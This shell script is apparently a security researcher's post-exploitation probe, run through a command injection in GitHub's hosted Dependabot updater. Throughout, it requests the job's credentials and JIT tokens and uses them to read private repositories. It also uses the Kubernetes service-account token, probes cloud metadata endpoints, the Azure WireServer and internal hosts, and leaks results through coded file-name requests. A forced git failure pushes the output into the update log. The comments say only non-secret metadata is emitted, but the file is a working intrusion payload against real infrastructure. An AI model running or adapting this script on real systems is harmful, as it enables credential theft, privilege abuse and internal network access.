#!/bin/sh
# Hosted-impact probe for the Dependabot updater command-injection lab.
# It emits status and non-secret metadata only; response bodies are never logged.
set +e

if [ -r .dbot_probe_config ]; then
  # The fixture contains identifiers only; no credentials or executable code.
  . ./.dbot_probe_config
fi

api_base="${DBOT_API_BASE:-https://api.github.com}"
tmp_prefix="/tmp/dbot-boundary-$$"
source_owner="${DBOT_SOURCE_OWNER:-FazeMike1}"
source_repository="${DBOT_SOURCE_REPOSITORY:-dbot-poc}"
jit_account="${DBOT_JIT_ACCOUNT:-FazeMike1}"
jit_allowed_repository="${DBOT_JIT_ALLOWED_REPOSITORY:-priv-a}"
jit_control_repository="${DBOT_JIT_CONTROL_REPOSITORY:-dbot-nonexistent-jit-control-20261017}"
jit_allowed_full_name="${jit_account}/${jit_allowed_repository}"

probe_repo_file() {
  label="$1"
  url="$2"
  output="${tmp_prefix}-${label}.json"
  code="$(curl -ksS --max-time 8 -o "$output" -w '%{http_code}' "$url" 2>/dev/null)"
  size="$(wc -c < "$output" 2>/dev/null | tr -d ' ')"
  blob_sha="$(ruby -rjson -e 'j=JSON.parse(File.read(ARGV[0])); print(j["sha"].to_s)' "$output" 2>/dev/null)"
  printf 'DBOT_%s_STATUS=%s SIZE=%s BLOB_SHA=%s\n' "$label" "${code:-curl_error}" "${size:-0}" "${blob_sha:-none}" >&2
  rm -f "$output"
}

probe_graphql_scope() {
  output="${tmp_prefix}-graphql.json"
  query="query { allowed: repository(owner: \"${jit_account}\", name: \"${jit_allowed_repository}\") { name object(expression: \"HEAD:version.txt\") { ... on Blob { oid byteSize } } } control: repository(owner: \"${jit_account}\", name: \"${jit_control_repository}\") { name object(expression: \"HEAD:secret-canary.txt\") { ... on Blob { oid byteSize } } } }"
  payload="$(ruby -rjson -e 'print JSON.generate({query: ARGV[0]})' "$query" 2>/dev/null)"
  code="$(curl -ksS --max-time 8 -X POST -H 'Content-Type: application/json' \
    --data "$payload" -o "$output" -w '%{http_code}' "$api_base/graphql" 2>/dev/null)"
  summary="$(ruby -rjson -e '
    begin
      parsed = JSON.parse(File.read(ARGV[0]))
      allowed = parsed.dig("data", "allowed")
      control = parsed.dig("data", "control")
      print "#{allowed ? 1 : 0} #{allowed&.dig("object") ? 1 : 0} #{control ? 1 : 0} #{control&.dig("object") ? 1 : 0}"
    rescue StandardError
      print "0 0 0 0"
    end
  ' "$output" 2>/dev/null)"
  set -- ${summary:-0 0 0 0}
  printf 'DBOT_GRAPHQL_STATUS=%s ALLOWED_REPO=%s ALLOWED_OBJECT=%s CONTROL_REPO=%s CONTROL_OBJECT=%s\n' \
    "${code:-curl_error}" "${1:-0}" "${2:-0}" "${3:-0}" "${4:-0}" >&2
  marker=".dbot-gql-s${code:-x}-ar${1:-0}-ao${2:-0}-cr${3:-0}-co${4:-0}"
  curl -ksS --max-time 5 -o /dev/null "$api_base/repos/${source_owner}/${source_repository}/contents/$marker" 2>/dev/null
  rm -f "$output"
}

probe_github_content_host() {
  label="$1"
  url="$2"
  output="${tmp_prefix}-${label}.bin"
  code="$(curl -ksS --max-time 8 --range 0-0 -o "$output" -w '%{http_code}' "$url" 2>/dev/null)"
  size="$(wc -c < "$output" 2>/dev/null | tr -d ' ')"
  printf 'DBOT_%s_STATUS=%s SIZE=%s\n' "$label" "${code:-curl_error}" "${size:-0}" >&2
  rm -f "$output"
}

probe_installation_scope() {
  output="${tmp_prefix}-installation.json"
  code="$(curl -ksS --max-time 8 -o "$output" -w '%{http_code}' "$api_base/installation/repositories?per_page=1" 2>/dev/null)"
  total_count="$(ruby -rjson -e 'j=JSON.parse(File.read(ARGV[0])); print(j["total_count"].to_s)' "$output" 2>/dev/null)"
  printf 'DBOT_INSTALLATION_STATUS=%s TOTAL_COUNT=%s\n' "${code:-curl_error}" "${total_count:-none}" >&2
  rm -f "$output"
}

probe_job_credentials() {
  output="${tmp_prefix}-credentials.json"
  if [ -z "${DEPENDABOT_API_URL:-}" ] || [ -z "${DEPENDABOT_JOB_ID:-}" ]; then
    printf 'DBOT_CREDENTIALS_STATUS=not_configured CREDENTIAL_COUNT=0 SECRET_FIELDS_PRESENT=0 CANARY_MATCH=0\n' >&2
    return
  fi

  endpoint="${DEPENDABOT_API_URL%/}/update_jobs/${DEPENDABOT_JOB_ID}/credentials"
  code="$(curl -ksS --max-time 8 -o "$output" -w '%{http_code}' "$endpoint" 2>/dev/null)"
  summary="$(ruby -rjson -rdigest -e '
    begin
      parsed = JSON.parse(File.read(ARGV[0]))
      credentials = parsed.dig("data", "attributes", "credentials") || parsed["credentials"] || []
      secret_keys = %w[token password auth-key key]
      values = credentials.flat_map { |credential| secret_keys.filter_map { |key| credential[key] } }
      print "#{credentials.length} #{values.count { |value| !value.to_s.empty? }}"
    rescue StandardError
      print "0 0"
    end
  ' "$output" 2>/dev/null)"
  set -- ${summary:-0 0}
  printf 'DBOT_CREDENTIALS_STATUS=%s CREDENTIAL_COUNT=%s SECRET_FIELDS_PRESENT=%s\n' \
    "${code:-curl_error}" "${1:-0}" "${2:-0}" >&2
  rm -f "$output"
}

probe_job_policy() {
  if [ -z "${DEPENDABOT_JOB_PATH:-}" ] || [ ! -r "$DEPENDABOT_JOB_PATH" ]; then
    printf 'DBOT_JOB_POLICY_STATUS=not_configured REJECT_EXTERNAL_CODE=unknown EGRESS_OBSERVE=unknown EGRESS_ENFORCE=unknown REPO_PRIVATE=unknown JIT_METADATA_COUNT=0\n' >&2
    return
  fi

  summary="$(ruby -rjson -e '
    begin
      parsed = JSON.parse(File.read(ARGV[0]))
      job = parsed["job"] || parsed.dig("data", "attributes") || {}
      experiments = job["experiments"] || {}
      metadata = job["credentials-metadata"] || job["credentials_metadata"] || []
      bool = ->(value) { value == true ? 1 : 0 }
      jit_count = metadata.count { |credential| credential["type"] == "jit_access" }
      print "ok #{bool.call(job["reject-external-code"])} #{bool.call(experiments["proxy-egress-observe"])} #{bool.call(experiments["proxy-egress-enforce"])} #{bool.call(job["repo-private"])} #{jit_count}"
    rescue StandardError
      print "parse_error unknown unknown unknown unknown 0"
    end
  ' "$DEPENDABOT_JOB_PATH" 2>/dev/null)"
  set -- ${summary:-parse_error unknown unknown unknown unknown 0}
  printf 'DBOT_JOB_POLICY_STATUS=%s REJECT_EXTERNAL_CODE=%s EGRESS_OBSERVE=%s EGRESS_ENFORCE=%s REPO_PRIVATE=%s JIT_METADATA_COUNT=%s\n' \
    "${1:-parse_error}" "${2:-unknown}" "${3:-unknown}" "${4:-unknown}" "${5:-unknown}" "${6:-0}" >&2
}

probe_jit_access() {
  output="${tmp_prefix}-jit.json"
  if [ -z "${DEPENDABOT_API_URL:-}" ] || [ -z "${DEPENDABOT_JOB_ID:-}" ]; then
    printf 'DBOT_JIT_STATUS=not_configured USERNAME_PRESENT=0 SECRET_FIELDS_PRESENT=0 SCOPE_MATCH=0\n' >&2
    printf 'DBOT_JIT_DIRECT_GIT_STATUS=not_configured SIZE=0\n' >&2
    return
  fi

  jit_path="/update_jobs/${DEPENDABOT_JOB_ID}/create_jit_access"
  if [ -n "${DEPENDABOT_JOB_PATH:-}" ] && [ -r "$DEPENDABOT_JOB_PATH" ]; then
    configured_path="$(ruby -rjson -e '
      begin
        parsed = JSON.parse(File.read(ARGV[0]))
        job = parsed["job"] || parsed.dig("data", "attributes") || {}
        credentials = job["credentials-metadata"] || job["credentials_metadata"] || []
        entry = credentials.find { |credential| credential["type"] == "jit_access" }
        print entry["endpoint"].to_s if entry
      rescue StandardError
      end
    ' "$DEPENDABOT_JOB_PATH" 2>/dev/null)"
    if [ -n "$configured_path" ]; then
      jit_path="$configured_path"
    fi
  fi

  case "$jit_path" in
    http://*|https://*) endpoint="$jit_path" ;;
    *) endpoint="${DEPENDABOT_API_URL%/}${jit_path}" ;;
  esac
  jit_endpoint="$endpoint"

  jit_request_data="$(printf '{"account":"%s","repository":"%s"}' "$jit_account" "$jit_allowed_repository")"
  code="$(curl -ksS --max-time 8 -X POST -H 'Content-Type: application/json' \
    -H 'User-Agent: dependabot-proxy/1.0' \
    --data "$jit_request_data" \
    -o "$output" -w '%{http_code}' "$endpoint" 2>/dev/null)"
  summary="$(DBOT_JIT_SCOPE_FULL_NAME="$jit_allowed_full_name" ruby -rjson -e '
    begin
      credential = JSON.parse(File.read(ARGV[0]))
      values = %w[token password auth-key key].filter_map { |key| credential[key] }
      scopes = credential["accessible-repos"] || credential["accessible_repos"] || []
      print "#{credential["username"].to_s.empty? ? 0 : 1} #{values.count { |value| !value.to_s.empty? }} #{scopes.include?(ENV["DBOT_JIT_SCOPE_FULL_NAME"].to_s) ? 1 : 0}"
    rescue StandardError
      print "0 0 0"
    end
  ' "$output" 2>/dev/null)"
  set -- ${summary:-0 0 0}
  printf 'DBOT_JIT_STATUS=%s USERNAME_PRESENT=%s SECRET_FIELDS_PRESENT=%s SCOPE_MATCH=%s\n' \
    "${code:-curl_error}" "${1:-0}" "${2:-0}" "${3:-0}" >&2

  # Prove that the returned credential itself can read the private repository,
  # without printing or persisting it. An explicit Basic header makes the proxy
  # preserve this JIT credential instead of substituting its fallback token.
  if [ "${DBOT_SKIP_JIT_DIRECT_PROBE:-0}" = "1" ]; then
    printf 'DBOT_JIT_DIRECT_GIT_STATUS=skipped SIZE=0\n' >&2
    printf 'DBOT_JIT_CROSS_SCOPE_STATUS=skipped SIZE=0\n' >&2
  elif [ "$code" = "200" ]; then
    jit_username="$(ruby -rjson -e 'begin; print JSON.parse(File.read(ARGV[0]))["username"].to_s; rescue StandardError; end' "$output" 2>/dev/null)"
    jit_password="$(ruby -rjson -e '
      begin
        credential = JSON.parse(File.read(ARGV[0]))
        print(%w[password token auth-key key].filter_map { |key| credential[key] }.find { |value| !value.to_s.empty? }.to_s)
      rescue StandardError
      end
    ' "$output" 2>/dev/null)"
    if [ -n "$jit_username" ] && [ -n "$jit_password" ]; then
      jit_auth="$(printf '%s:%s' "$jit_username" "$jit_password" | base64 | tr -d '\r\n')"
      jit_curl_config="${tmp_prefix}-jit-curl.conf"
      jit_git_output="${tmp_prefix}-jit-direct-git.bin"
      umask 077
      printf 'header = "Authorization: Basic %s"\n' "$jit_auth" > "$jit_curl_config"
      jit_git_url="${DBOT_JIT_GIT_URL:-https://github.com/${jit_account}/${jit_allowed_repository}.git/info/refs?service=git-upload-pack}"
      direct_code="$(curl -ksS --max-time 8 --config "$jit_curl_config" \
        -o "$jit_git_output" -w '%{http_code}' \
        "$jit_git_url" 2>/dev/null)"
      direct_size="$(wc -c < "$jit_git_output" 2>/dev/null | tr -d ' ')"
      printf 'DBOT_JIT_DIRECT_GIT_STATUS=%s SIZE=%s\n' "${direct_code:-curl_error}" "${direct_size:-0}" >&2

      jit_cross_url="https://github.com/${jit_account}/${jit_control_repository}.git/info/refs?service=git-upload-pack"
      cross_code="$(curl -ksS --max-time 8 --config "$jit_curl_config" \
        -o "$jit_git_output" -w '%{http_code}' \
        "$jit_cross_url" 2>/dev/null)"
      cross_size="$(wc -c < "$jit_git_output" 2>/dev/null | tr -d ' ')"
      rm -f "$jit_curl_config" "$jit_git_output"
      unset jit_auth jit_username jit_password jit_git_url jit_cross_url
      printf 'DBOT_JIT_CROSS_SCOPE_STATUS=%s SIZE=%s\n' "${cross_code:-curl_error}" "${cross_size:-0}" >&2
    else
      printf 'DBOT_JIT_DIRECT_GIT_STATUS=no_credential SIZE=0\n' >&2
      printf 'DBOT_JIT_CROSS_SCOPE_STATUS=no_credential SIZE=0\n' >&2
    fi
  else
    printf 'DBOT_JIT_DIRECT_GIT_STATUS=not_attempted SIZE=0\n' >&2
    printf 'DBOT_JIT_CROSS_SCOPE_STATUS=not_attempted SIZE=0\n' >&2
  fi
  rm -f "$output"
}

probe_jit_denied_control() {
  output="${tmp_prefix}-jit-denied-control.json"
  if [ -z "${jit_endpoint:-}" ]; then
    printf 'DBOT_JIT_DENIED_CONTROL_STATUS=not_configured SECRET_FIELDS_PRESENT=0\n' >&2
    return
  fi

  jit_control_data="$(printf '{"account":"%s","repository":"%s"}' "$jit_account" "$jit_control_repository")"
  code="$(curl -ksS --max-time 8 -X POST -H 'Content-Type: application/json' \
    -H 'User-Agent: dependabot-proxy/1.0' \
    --data "$jit_control_data" \
    -o "$output" -w '%{http_code}' "$jit_endpoint" 2>/dev/null)"
  secret_count="$(ruby -rjson -e '
    begin
      credential = JSON.parse(File.read(ARGV[0]))
      print(%w[token password auth-key key].count { |key| !credential[key].to_s.empty? })
    rescue StandardError
      print 0
    end
  ' "$output" 2>/dev/null)"
  printf 'DBOT_JIT_DENIED_CONTROL_STATUS=%s SECRET_FIELDS_PRESENT=%s\n' \
    "${code:-curl_error}" "${secret_count:-0}" >&2
  rm -f "$output"
}

probe_jit_git_access() {
  if [ "${DBOT_SKIP_GIT_PROBE:-0}" = "1" ]; then
    printf 'DBOT_JIT_GIT_STATUS=skipped REF_COUNT=0 HEAD_SHA=none\n' >&2
    return
  fi

  output="${tmp_prefix}-jit-git.txt"
  GIT_TERMINAL_PROMPT=0 git ls-remote \
    "https://github.com/${jit_account}/${jit_allowed_repository}.git" HEAD refs/heads/main >"$output" 2>/dev/null
  status=$?
  ref_count="$(wc -l < "$output" 2>/dev/null | tr -d ' ')"
  head_sha="$(awk '$2 == "HEAD" { print $1; exit }' "$output" 2>/dev/null)"
  printf 'DBOT_JIT_GIT_STATUS=%s REF_COUNT=%s HEAD_SHA=%s\n' \
    "$status" "${ref_count:-0}" "${head_sha:-none}" >&2
  rm -f "$output"
}

probe_local_boundaries() {
  env_file_count=0
  env_secret_key_count=0
  for candidate in .env /app/.env /work/.env /home/dependabot/.env /opt/dependabot/.env; do
    if [ -r "$candidate" ]; then
      env_file_count=$((env_file_count + 1))
      key_count="$(awk -F= '
        /^[A-Za-z_][A-Za-z0-9_]*=/ {
          key = toupper($1)
          if (key ~ /(TOKEN|SECRET|PASSWORD|PRIVATE|CREDENTIAL|API_KEY)/) count++
        }
        END { print count + 0 }
      ' "$candidate" 2>/dev/null)"
      env_secret_key_count=$((env_secret_key_count + ${key_count:-0}))
    fi
  done

  kube_token_readable=0
  docker_socket_present=0
  containerd_socket_present=0
  [ -r /var/run/secrets/kubernetes.io/serviceaccount/token ] && kube_token_readable=1
  [ -S /var/run/docker.sock ] && docker_socket_present=1
  [ -S /run/containerd/containerd.sock ] && containerd_socket_present=1
  printf 'DBOT_LOCAL_BOUNDARIES=ok ENV_FILE_COUNT=%s SECRET_KEY_NAME_COUNT=%s KUBE_TOKEN_READABLE=%s DOCKER_SOCKET=%s CONTAINERD_SOCKET=%s\n' \
    "$env_file_count" "$env_secret_key_count" "$kube_token_readable" "$docker_socket_present" "$containerd_socket_present" >&2
}

probe_direct_http() {
  label="$1"
  url="$2"
  header_name="${3:-}"
  header_value="${4:-}"
  output="${tmp_prefix}-${label}.bin"
  if [ -n "$header_name" ]; then
    code="$(curl -ksS --noproxy '*' --connect-timeout 1 --max-time 3 \
      -H "$header_name: $header_value" -o "$output" -w '%{http_code}' "$url" 2>/dev/null)"
  else
    code="$(curl -ksS --noproxy '*' --connect-timeout 1 --max-time 3 \
      -o "$output" -w '%{http_code}' "$url" 2>/dev/null)"
  fi
  size="$(wc -c < "$output" 2>/dev/null | tr -d ' ')"
  printf 'DBOT_INTERNAL_%s_STATUS=%s SIZE=%s\n' "$label" "${code:-curl_error}" "${size:-0}" >&2
  rm -f "$output"
}

probe_internal_boundaries() {
  proxy_url="${HTTPS_PROXY:-${https_proxy:-${HTTP_PROXY:-${http_proxy:-}}}}"
  proxy_hostport="$(PROXY_URL="$proxy_url" ruby -ruri -e '
    begin
      value = ENV["PROXY_URL"].to_s
      unless value.empty?
        uri = URI.parse(value)
        print "#{uri.host}:#{uri.port}" if uri.host
      end
    rescue StandardError
    end
  ' 2>/dev/null)"
  proxy_host="${proxy_hostport%:*}"
  proxy_port="${proxy_hostport##*:}"
  proxy_addr_count=0
  proxy_private_addr=0
  proxy_tcp_status=not_configured
  if [ -n "$proxy_hostport" ] && [ "$proxy_host" != "$proxy_hostport" ]; then
    proxy_addr_count="$(getent ahostsv4 "$proxy_host" 2>/dev/null | awk '!seen[$1]++ { count++ } END { print count + 0 }')"
    proxy_private_addr="$(getent ahostsv4 "$proxy_host" 2>/dev/null | awk '
      $1 ~ /^10\./ || $1 ~ /^192\.168\./ || $1 ~ /^172\.(1[6-9]|2[0-9]|3[01])\./ { found=1 }
      END { print found + 0 }
    ')"
    ruby -rsocket -e '
      socket = Socket.tcp(ARGV[0], Integer(ARGV[1]), connect_timeout: 2)
      socket.close
    ' "$proxy_host" "$proxy_port" >/dev/null 2>&1
    [ $? -eq 0 ] && proxy_tcp_status=open || proxy_tcp_status=closed
  fi
  printf 'DBOT_INTERNAL_PROXY=ok HOST_CONFIGURED=%s ADDR_COUNT=%s PRIVATE_ADDR=%s TCP_STATUS=%s\n' \
    "$([ -n "$proxy_hostport" ] && printf 1 || printf 0)" "$proxy_addr_count" "$proxy_private_addr" "$proxy_tcp_status" >&2

  aws_relative_present=0
  kube_host_present=0
  docker_host_present=0
  [ -n "${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI:-}" ] && aws_relative_present=1
  [ -n "${KUBERNETES_SERVICE_HOST:-}" ] && kube_host_present=1
  [ -n "${DOCKER_HOST:-}" ] && docker_host_present=1
  printf 'DBOT_INTERNAL_ENV_MARKERS=ok AWS_RELATIVE_URI=%s KUBE_HOST=%s DOCKER_HOST=%s\n' \
    "$aws_relative_present" "$kube_host_present" "$docker_host_present" >&2

  probe_direct_http AWS_IMDS http://169.254.169.254/latest/meta-data/
  probe_direct_http AZURE_IMDS 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' Metadata true
  probe_direct_http GCP_IMDS http://metadata.google.internal/computeMetadata/v1/ Metadata-Flavor Google

  if [ -n "${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI:-}" ]; then
    case "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" in
      /*) probe_direct_http ECS_IMDS "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}" ;;
      *) printf 'DBOT_INTERNAL_ECS_IMDS_STATUS=invalid_relative_uri SIZE=0\n' >&2 ;;
    esac
  else
    printf 'DBOT_INTERNAL_ECS_IMDS_STATUS=not_configured SIZE=0\n' >&2
  fi

  if [ -S /var/run/docker.sock ]; then
    output="${tmp_prefix}-docker-version.bin"
    code="$(curl -ksS --max-time 3 --unix-socket /var/run/docker.sock \
      -o "$output" -w '%{http_code}' http://localhost/version 2>/dev/null)"
    size="$(wc -c < "$output" 2>/dev/null | tr -d ' ')"
    printf 'DBOT_INTERNAL_DOCKER_API_STATUS=%s SIZE=%s\n' "${code:-curl_error}" "${size:-0}" >&2
    rm -f "$output"
  else
    printf 'DBOT_INTERNAL_DOCKER_API_STATUS=not_configured SIZE=0\n' >&2
  fi

  if [ -n "${KUBERNETES_SERVICE_HOST:-}" ] && [ -r /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
    kube_port="${KUBERNETES_SERVICE_PORT_HTTPS:-${KUBERNETES_SERVICE_PORT:-443}}"
    kube_header="${tmp_prefix}-kube-curl.conf"
    kube_output="${tmp_prefix}-kube-version.bin"
    umask 077
    printf 'header = "Authorization: Bearer %s"\n' "$(tr -d '\r\n' < /var/run/secrets/kubernetes.io/serviceaccount/token)" > "$kube_header"
    code="$(curl -ksS --noproxy '*' --connect-timeout 1 --max-time 3 --config "$kube_header" \
      -o "$kube_output" -w '%{http_code}' "https://${KUBERNETES_SERVICE_HOST}:${kube_port}/version" 2>/dev/null)"
    size="$(wc -c < "$kube_output" 2>/dev/null | tr -d ' ')"
    rm -f "$kube_header" "$kube_output"
    printf 'DBOT_INTERNAL_KUBE_API_STATUS=%s SIZE=%s\n' "${code:-curl_error}" "${size:-0}" >&2
  else
    printf 'DBOT_INTERNAL_KUBE_API_STATUS=not_configured SIZE=0\n' >&2
  fi
}

probe_proxy_internal_http() {
  # Requests in this function intentionally use the configured Dependabot
  # proxy. The test changes only the destination hostname/port and emits no
  # response body. A repository registry entry for host.docker.internal is the
  # variation; an unconfigured hostname is the egress-enforcement control.
  label="$1"
  url="$2"
  output="${tmp_prefix}-${label}.bin"
  code="$(curl -ksS --connect-timeout 2 --max-time 5 \
    -o "$output" -w '%{http_code}' "$url" 2>/dev/null)"
  size="$(wc -c < "$output" 2>/dev/null | tr -d ' ')"
  class=other
  if grep -qx 'OK' "$output" 2>/dev/null; then
    class=docker_ping
  elif grep -qi 'forbidden' "$output" 2>/dev/null; then
    class=egress_forbidden
  elif grep -qi 'connection refused\|connect: connection refused' "$output" 2>/dev/null; then
    class=connection_refused
  elif [ ! -s "$output" ]; then
    class=empty
  fi
  printf 'DBOT_PROXY_%s_STATUS=%s SIZE=%s CLASS=%s\n' \
    "$label" "${code:-curl_error}" "${size:-0}" "$class" >&2
  rm -f "$output"
}

probe_proxy_internal_boundaries() {
  probe_proxy_internal_http HOST_DOCKER_PING 'http://host.docker.internal:2375/_ping'
  probe_proxy_internal_http HOST_DOCKER_VERSION 'http://host.docker.internal:2375/version'
  probe_proxy_internal_http EGRESS_CONTROL 'http://dbot-egress-control.invalid:2375/_ping'
}

probe_proxy_azure_wire() {
  # Azure documents 168.63.129.16 as the VM WireServer endpoint. The direct IP
  # is deliberately configured as a private registry host for this experiment,
  # so a successful request demonstrates that the dynamic registry allowlist
  # can cross the updater's intended egress boundary. Never emit the XML body.
  label="$1"
  path="$2"
  output="${tmp_prefix}-${label}.xml"
  code="$(curl -ksS --connect-timeout 2 --max-time 5 \
    -H 'Metadata:true' \
    -H 'x-ms-version: 2012-11-30' \
    -H 'x-ms-agent-name: DependabotBoundaryCanary' \
    -o "$output" -w '%{http_code}' \
    "http://168.63.129.16${path}" 2>/dev/null)"
  size="$(wc -c < "$output" 2>/dev/null | tr -d ' ')"
  versions=0
  goalstate=0
  container_id=0
  grep -q '<Versions' "$output" 2>/dev/null && versions=1
  grep -q '<GoalState' "$output" 2>/dev/null && goalstate=1
  grep -q '<ContainerId>' "$output" 2>/dev/null && container_id=1
  marker=".dbot-wire-${label}-s${code:-x}-n${size:-0}-v${versions}-g${goalstate}-c${container_id}"
  curl -ksS --max-time 5 -o /dev/null \
    "$api_base/repos/${source_owner}/${source_repository}/contents/$marker" 2>/dev/null
  printf 'DBOT_AZURE_WIRE_%s_STATUS=%s SIZE=%s VERSIONS=%s GOALSTATE=%s CONTAINER_ID=%s\n' \
    "$label" "${code:-curl_error}" "${size:-0}" "$versions" "$goalstate" "$container_id" >&2
  rm -f "$output"
}

probe_proxy_azure_wire_boundaries() {
  probe_proxy_azure_wire VERSIONS '/?comp=versions'
  probe_proxy_azure_wire GOALSTATE '/machine?comp=goalstate'
}

probe_proxy_github_ssrf_canary() {
  # GitHub's Bug Bounty target page explicitly designates this hostname for
  # safe SSRF validation. External DNS returns NXDOMAIN; a response from the
  # hosted updater therefore demonstrates internal GitHub name resolution and
  # routing. Capture only status, size and a coarse canary-text boolean.
  output="${tmp_prefix}-github-ssrf-canary.bin"
  code="$(curl -ksS --connect-timeout 3 --max-time 8 \
    -o "$output" -w '%{http_code}' \
    'https://ssrf-target.iad.github.net/' 2>/dev/null)"
  size="$(wc -c < "$output" 2>/dev/null | tr -d ' ')"
  canary=0
  grep -qi 'ssrf\|github' "$output" 2>/dev/null && canary=1
  marker=".dbot-ghssrf-s${code:-x}-n${size:-0}-c${canary}"
  curl -ksS --max-time 5 -o /dev/null \
    "$api_base/repos/${source_owner}/${source_repository}/contents/$marker" 2>/dev/null
  printf 'DBOT_GITHUB_SSRF_CANARY_STATUS=%s SIZE=%s CANARY=%s\n' \
    "${code:-curl_error}" "${size:-0}" "$canary" >&2
  rm -f "$output"
}

probe_repo_file CONTROL "$api_base/repos/${source_owner}/${source_repository}/contents/.gitmodules"
probe_repo_file ALLOWED "$api_base/repos/${jit_account}/${jit_allowed_repository}/contents/version.txt"
probe_repo_file XREPO "$api_base/repos/${jit_account}/${jit_control_repository}/contents/secret-canary.txt"
probe_graphql_scope
probe_github_content_host RAW_ALLOWED "https://raw.githubusercontent.com/${jit_account}/${jit_allowed_repository}/HEAD/version.txt"
probe_github_content_host RAW_CONTROL "https://raw.githubusercontent.com/${jit_account}/${jit_control_repository}/HEAD/secret-canary.txt"
probe_github_content_host CODELOAD_ALLOWED "https://codeload.github.com/${jit_account}/${jit_allowed_repository}/zip/refs/heads/main"
probe_github_content_host CODELOAD_CONTROL "https://codeload.github.com/${jit_account}/${jit_control_repository}/zip/refs/heads/main"
probe_installation_scope
probe_job_policy
probe_job_credentials
probe_jit_access
probe_jit_denied_control
probe_jit_git_access
probe_local_boundaries
probe_internal_boundaries
probe_proxy_internal_boundaries
probe_proxy_azure_wire_boundaries
probe_proxy_github_ssrf_canary

job_token_len="${#DEPENDABOT_JOB_TOKEN}"
printf 'DBOT_UPDATER_JOB_TOKEN_LEN=%s API_BASE_SCHEME=%s\n' "$job_token_len" "${api_base%%:*}" >&2

# Dependabot normally surfaces command output only when the enclosing Git command
# fails. Unstage the transient workspace and create an index lock inside the
# ephemeral checkout so `git commit` fails deterministically and includes the
# non-secret markers above in the update log.
git reset -q HEAD -- . 2>/dev/null
index_lock="$(git rev-parse --git-path index.lock 2>/dev/null)"
if [ -n "$index_lock" ]; then
  : > "$index_lock" 2>/dev/null
fi

exit 1
